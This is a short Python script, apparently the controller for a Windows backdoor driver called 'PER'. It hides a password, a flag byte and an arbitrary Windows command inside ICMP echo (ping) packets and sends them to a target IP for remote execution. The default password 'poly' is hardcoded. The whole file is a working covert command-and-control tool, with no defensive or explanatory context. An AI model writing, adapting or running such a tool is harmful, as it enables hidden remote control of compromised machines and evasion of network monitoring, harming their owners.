from scapy.all import IP, ICMP, send
import argparse

DEFAULT_PASSWORD = "poly"

parser = argparse.ArgumentParser(
    prog='sender', description="Send commands to PER driver")

parser.add_argument('IP', help='IP address of the target')
parser.add_argument('COMMAND', help='Windows command to execute on the target')
parser.add_argument('--password', help='Specify a password',
                    default=DEFAULT_PASSWORD)

args = parser.parse_args()

payload = bytearray()

payload += args.password.encode('utf-8')
payload += bytes([1])  # flag
payload += args.COMMAND.encode('utf-8')

packet = IP(dst=args.IP) / ICMP(type=8, id=0x1234, seq=1) / bytes(payload)

send(packet)

print("OK")
